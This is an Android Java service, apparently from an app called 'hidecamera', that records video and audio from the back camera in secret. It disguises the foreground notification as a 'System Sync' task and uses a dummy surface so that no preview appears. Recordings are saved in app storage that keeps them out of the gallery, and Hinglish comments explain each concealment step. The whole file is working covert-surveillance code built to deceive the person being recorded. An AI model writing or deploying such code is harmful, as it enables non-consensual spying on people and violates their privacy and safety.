package com.example.hidecamera;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.view.SurfaceView;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.File;

public class BackgroundRecorderService extends Service {
    private static final int NOTIFICATION_ID = 101;
    private static final String CHANNEL_ID = "Background_Sync_Channel";
    
    private Camera mCamera;
    private MediaRecorder mMediaRecorder;
    private SurfaceView mDummySurfaceView;
    private boolean isRecording = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        
        // Hide Camera active hone par fake background sync notification dikhega
        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_desc))
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .build();

        startForeground(NOTIFICATION_ID, notification);

        if (!isRecording) {
            startRecordingEngine();
        }
        return START_STICKY;
    }

    private void startRecordingEngine() {
        try {
            mCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
            mMediaRecorder = new MediaRecorder();

            mCamera.unlock();
            mMediaRecorder.setCamera(mCamera);
            mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
            mMediaRecorder.setProfile(CamcorderProfile.get(Camera.CameraInfo.CAMERA_FACING_BACK, CamcorderProfile.QUALITY_720P));

            // Sabse Important: File Gallery me nahi, App ke internal private hidden folder me save hogi
            File outputDir = getExternalFilesDir(null); 
            File videoFile = new File(outputDir, "SEC_VID_" + System.currentTimeMillis() + ".mp4");
            mMediaRecorder.setOutputFile(videoFile.getAbsolutePath());

            // Fake layout taaki screen normal rahe aur user ko camera preview na dikhe
            mDummySurfaceView = new SurfaceView(this);
            mMediaRecorder.setPreviewDisplay(mDummySurfaceView.getHolder().getSurface());

            mMediaRecorder.prepare();
            mMediaRecorder.start();
            isRecording = true;
        } catch (Exception e) {
            e.printStackTrace();
            stopSelf();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID, "System Sync Channel", NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public void onDestroy() {
        if (isRecording) {
            try {
                mMediaRecorder.stop();
                mMediaRecorder.reset();
                mMediaRecorder.release();
                mCamera.lock();
                mCamera.release();
            } catch (Exception e) {
                e.printStackTrace();
            }
            isRecording = false;
        }
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
